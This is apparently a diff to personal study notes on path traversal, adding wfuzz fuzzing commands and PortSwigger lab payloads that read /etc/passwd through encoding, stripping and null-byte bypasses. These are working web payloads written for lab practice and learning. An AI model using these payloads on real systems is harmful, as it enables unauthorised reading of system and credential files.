@@ -33,7 +33,7 @@ http://192.168.118.126/app/specials?menu=../../../../../../../windows/win.ini
 -c: display color in terminal output        
 -z: payload parameter
 ```
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.145.101/relativePathingVerbose.php?path=../../../../../../../../../../../../../../FUZZ
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 400,404 http://192.168.145.101/relativePathingVerbose.php?path=../../../../../../../../../../../../../../FUZZ
 ```
 
 --hh : suppress the erroneous response sizes        
@@ -70,3 +70,31 @@ config/application.yml
 - Now run Wfuzz with our word lists.
 ``` 
 wfuzz -w paths.txt -w files.txt --hh 0 http://192.168.248.131/specials?menu=FUZZFUZ2Z
+```
+
+#### Portswigger labs
+
+- #### File path traversal sequences blocked with absolute path bypass
+```
+/image?filename=/etc/passwd 
+```
+
+- #### File path traversal, traversal sequences stripped non-recursively
+```
+/image?filename=....//....//....//etc/passwd
+```
+
+- ####  File path traversal, traversal sequences stripped with superfluous URL-decode
+```
+/image?filename=..%252f..%252f..%252fetc/passwd 
+```
+
+- #### File path traversal, validation of start of path
+```
+/image?filename=/var/www/images/../../../../../../../etc/passwd
+```
+
+- #### File path traversal, validation of file extension with null byte bypass
+```
+/image?filename=../../../etc/passwd%00.png
+```
